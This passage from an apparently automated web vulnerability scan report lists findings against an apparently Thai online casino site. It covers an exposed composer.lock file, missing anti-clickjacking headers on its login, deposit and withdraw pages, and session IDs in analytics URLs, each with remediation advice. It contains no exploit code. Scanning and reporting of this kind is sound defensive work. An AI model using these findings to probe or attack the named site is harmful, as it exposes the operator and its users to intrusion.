A sensitive file was identified as accessible or available. This may leak administrative, configuration, or credential information which can be leveraged by a malicious individual to further attack the system or conduct social engineering efforts.
URL	https://member.panama8888b.com/composer.lock
Method	GET
Parameter	
Attack	
Evidence	HTTP/1.1 200 OK
Other Info	composer
URL	https://member.panama8888b.com:443/composer.lock
Method	GET
Parameter	
Attack	
Evidence	HTTP/1.1 200 OK
Other Info	composer
Instances	2
Solution	
Consider whether or not the component is actually required in production, if it isn't then disable it. If it is then ensure access to it requires appropriate authentication and authorization, or limit exposure to internal systems or specific source IPs, etc.
Reference	https://blog.hboeck.de/archives/892-Introducing-Snallygaster-a-Tool-to-Scan-for-Secrets-on-Web-Servers.html
CWE Id	538
WASC Id	13
Plugin Id	40035
Medium
Missing Anti-clickjacking Header
Description	
The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.
URL	https://member.panama8888b.com/auth/login
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/game
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/register
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward/category/1
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/reward/category/2
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/dashboard
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/dashboard?line_id=%40vippnm888&tg_id=panama888v
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/deposit
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/history
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/refunds
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/reward
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://member.panama8888b.com/user/withdraw
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1673999601&target=OPTIMIZATION_TARGET_PAGE_VISIBILITY
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1679317318&target=OPTIMIZATION_TARGET_LANGUAGE_DETECTION
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1696268326&target=OPTIMIZATION_TARGET_OMNIBOX_URL_SCORING
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1728324084&target=OPTIMIZATION_TARGET_OMNIBOX_ON_DEVICE_TAIL_SUGGEST
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1745311339&target=OPTIMIZATION_TARGET_GEOLOCATION_PERMISSION_PREDICTIONS
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1745312779&target=OPTIMIZATION_TARGET_NOTIFICATION_PERMISSION_PREDICTIONS
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=1751987362&target=OPTIMIZATION_TARGET_CLIENT_SIDE_PHISHING
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=240731042075&target=OPTIMIZATION_TARGET_SEGMENTATION_COMPOSE_PROMOTION
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
URL	https://optimizationguide-pa.googleapis.com/downloads?name=5&target=OPTIMIZATION_TARGET_PAGE_TOPICS_V2
Method	GET
Parameter	x-frame-options
Attack	
Evidence	
Other Info	
Instances	22
Solution	
Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.

If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's "frame-ancestors" directive.
Reference	https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
CWE Id	1021
WASC Id	15
Plugin Id	10020
Medium
Session ID in URL Rewrite
Description	
URL rewrite is used to track user session ID. The session ID may be disclosed via cross-site referer header. In addition, the session ID might be stored in browser history or server logs.
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754277163561&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754277162&sct=2&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=7591
Method	POST
Parameter	sid
Attack	
Evidence	1754277162
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754277163561&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754277162&sct=2&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=34739&tfd=913274
Method	POST
Parameter	sid
Attack	
Evidence	1754277162
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754277163561&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754277162&sct=2&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdeposit&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=2077&tfd=12601
Method	POST
Parameter	sid
Attack	
Evidence	1754277162
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282530635&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=9075
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282530635&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=2208&tfd=20088
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282530635&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=11081&tfd=20084
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282548341&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fgame&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=3551
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282548341&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=3&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fgame&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=user_engagement&_et=22933&tfd=26496
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1h1v9171603508za200zd9171603508&_p=1754282548341&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~102015666~103116026~103200004~103233427~104684208~104684211~104948813~105033763~105033765~105087538~105087540~105103161~105103163~105113532&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754280655&sct=3&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fgame&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=1547&tfd=8563
Method	POST
Parameter	sid
Attack	
Evidence	1754280655
Other Info	
